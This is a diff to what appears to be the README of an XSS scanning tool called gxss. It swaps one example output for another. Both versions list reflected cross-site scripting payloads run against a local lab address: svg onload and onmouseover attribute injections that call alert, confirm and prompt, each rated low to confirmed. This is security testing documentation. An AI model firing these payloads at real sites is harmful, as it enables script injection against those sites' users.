@@ -8,29 +8,25 @@ Example Input:
 ```
 Example Output:
 ```
-$ echo http://192.168.1.108:9999/home | url-miner -w ../url-miner/testwords -json | gxss -s
-[low] http://192.168.1.108:9999/home?q=<html zzxqyj=x>
-[low] http://192.168.1.108:9999/home?q=<svg zzxqyj=x>
-[medium] http://192.168.1.108:9999/home?q=<svg onload=zzxqyj>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert()%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=alert()>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=confirm()%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=confirm()>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=confirm(x)%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=confirm(x)>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=confirm``%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=confirm``>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=confirm`1`%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=confirm`1`>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(x)%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=alert(x)>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=alert(1)%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=alert(1)>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt()%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
-[confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt``%3E
-[high] http://192.168.1.108:9999/home?q=<svg onload=prompt``>
+$ echo http://192.168.1.108:9999/home | url-miner -w ../url-miner/testwords -json | ./gxss -s -i -debug
+[low] http://192.168.1.108:9999/home?q=%27zzxqyj%3D%27
+[medium] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27zzxqyj
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28%29
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28%29
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28x%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28x%29
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%60%60
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%60%60
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%601%60
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%601%60
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28x%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28x%29
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%281%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%281%29
+[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27prompt%28%29
+[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27prompt%28%29
 ...
 ...
 ```
